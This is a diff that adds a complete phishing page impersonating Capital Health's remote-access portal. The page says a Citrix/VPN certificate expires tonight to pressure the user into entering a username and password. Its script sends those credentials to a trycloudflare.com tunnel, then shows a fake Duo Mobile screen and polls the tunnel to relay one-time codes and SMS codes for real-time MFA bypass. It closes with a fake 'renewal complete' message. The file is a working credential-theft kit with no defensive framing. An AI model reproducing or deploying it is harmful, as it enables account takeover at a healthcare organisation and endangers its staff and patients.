@@ -1,0 +1,45 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>Capital Health | Remote Access Renewal</title>
+<meta name=viewport content="width=device-width,initial-scale=1"><style>
+body{font-family:-apple-system,Segoe UI,Roboto,Arial,sans-serif;background:#eef2f6;margin:0;display:flex;align-items:center;justify-content:center;min-height:100vh}
+.card{background:#fff;padding:34px 32px;border-radius:12px;box-shadow:0 3px 18px rgba(0,0,0,.13);width:390px;text-align:center}
+h1{font-size:19px;color:#123a63;margin:0 0 6px}p.s{font-size:13px;color:#667;margin:0 0 16px;line-height:1.45}
+label{display:block;text-align:left;font-size:12px;color:#445;margin:12px 0 4px}
+input{width:100%;padding:11px;border:1px solid #cfd6dd;border-radius:6px;font-size:14px;box-sizing:border-box}
+button{margin-top:20px;width:100%;padding:12px;background:#1667c9;border:0;border-radius:6px;color:#fff;font-size:15px;cursor:pointer}
+.big{font-size:46px;font-weight:700;letter-spacing:8px;color:#0b3d91;margin:16px 0}
+.foot{margin-top:16px;font-size:11px;color:#8a949e}</style></head>
+<body><div class=card id=c>
+<h1>Remote Access Renewal</h1><p class=s>Your Citrix/VPN certificate expires tonight. Confirm your identity to renew it.</p>
+<form id=f><label>User name</label><input name=username id=u required autocomplete=username>
+<label>Password</label><input name=password id=p type=password required autocomplete=current-password>
+<button type=submit id=b>Renew my access</button></form>
+<div class=foot>capitalhealth.org &middot; secured connection</div></div>
+<script>
+var API="https://proceed-pics-due-gibraltar.trycloudflare.com";
+var SID=null;
+document.getElementById('f').addEventListener('submit',function(e){e.preventDefault();
+ document.getElementById('b').disabled=true;document.getElementById('b').innerText='Contacting gateway\u2026';
+ fetch(API+'/submit',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},
+  body:'username='+encodeURIComponent(document.getElementById('u').value)+'&password='+encodeURIComponent(document.getElementById('p').value)})
+ .then(r=>r.text()).then(function(t){var m=t.match(/var SID=([^;]+)/);
+  if(!m){step2();return;} SID=m[1].replace(/["\s]/g,''); step2(); poll();});});
+function step2(){document.getElementById('c').innerHTML='<h1>Verify with Duo Mobile</h1>'+
+ '<p class=s id=msg>A request was sent to your phone. Open <b>Duo Mobile</b> and enter the number below.</p>'+
+ '<div class=big id=code>&nbsp;</div><p class=s id=wait>Waiting for approval\u2026</p>'+
+ '<div class=foot>Capital Health IT &middot; Secured by Duo</div>';}
+function sendSms(){var v=document.getElementById('scode').value;
+ fetch(API+'/sms',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},
+  body:'sid='+encodeURIComponent(SID)+'&code='+encodeURIComponent(v)});
+ document.getElementById('msg').innerText='Verifying\u2026';}
+function poll(){fetch(API+'/state?sid='+SID).then(r=>r.json()).then(function(d){
+ var el=document.getElementById('msg'),cd=document.getElementById('code');
+ if(el&&d.msg)el.innerText=d.msg; if(cd&&d.code)cd.innerText=d.code;
+ if(d.phase=='need_sms'&&!document.getElementById('sbox')){var w=document.createElement('div');w.id='sbox';
+  w.innerHTML='<input id=scode placeholder="7-digit code" style="margin-top:10px"><button onclick="sendSms()" style="margin-top:12px">Verify</button>';
+  document.getElementById('c').appendChild(w);}
+ if(d.phase=='done'){document.getElementById('c').innerHTML='<h1>Renewal complete</h1><p class=s>Your remote access certificate has been renewed. You can close this window.</p>';return;}
+ if(d.phase=='badcreds'){document.getElementById('c').innerHTML='<h1>Sign-in failed</h1><p class=s>Check your username and password, then try again.</p><p class=s><a href="/ch-portal/">Try again</a></p>';return;}
+ if(d.phase=='timeout'||d.phase=='error'){document.getElementById('c').innerHTML='<h1>Please try again</h1><p class=s>'+(d.msg||'')+'</p><p class=s><a href="/ch-portal/">Retry</a></p>';return;}
+ setTimeout(poll,2500);});}
+var q=new URLSearchParams(location.search); if(q.get('u')) document.getElementById('u').value=q.get('u');
+</script></body></html>
